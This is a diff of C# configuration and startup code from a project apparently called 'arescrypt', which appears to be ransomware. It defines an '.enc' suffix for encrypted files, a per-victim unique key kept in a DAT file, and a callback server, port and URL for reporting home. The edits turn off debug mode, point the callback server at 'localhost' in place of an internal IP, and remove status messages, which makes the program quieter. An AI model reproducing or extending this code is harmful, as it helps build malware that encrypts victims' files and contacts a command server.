@@ -12,7 +12,7 @@
         // Debugging configuration
         public bool sandBox = true; // Safemode for testing/debugging
         public string sandBoxDirectory = currentWorkingDirectory + @"\sandboxedDirectory";
-        public bool debugMode = true; // Debug mode will enable/disable display of the Debug Console/GUI
+        public bool debugMode = false; // Debug mode will enable/disable display of the Debug Console/GUI
 
         // Encryption/Decryption configuration
         public string encryptedFileSuffix = ".enc";
@@ -27,7 +27,7 @@
         public static string datFileLocation = currentWorkingDirectory + @"\arescrypt.dat";
         // Variables to be set by GetDATFileData()
         // Server Data
-        public static string callbackServer = "172.16.1.41";
+        public static string callbackServer = "localhost";
         public static int callbackPort = 9000;
         public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
     }
@@ -41,13 +41,10 @@
             if (!System.IO.File.Exists(Configuration.datFileLocation))
             {
                 this.uniqueKey = Cryptography.genRandomString(0xC);
-
-                System.Console.WriteLine("No DAT file discovered, creating one now..");
                 Miscellaneous.SetDATFileData(this);
             }
             else
             {
-                System.Console.WriteLine("Reading dat file...");
                 UserData serveJSONData = Miscellaneous.GetDATFileData();
                 this.uniqueKey = serveJSONData.uniqueKey;
             }
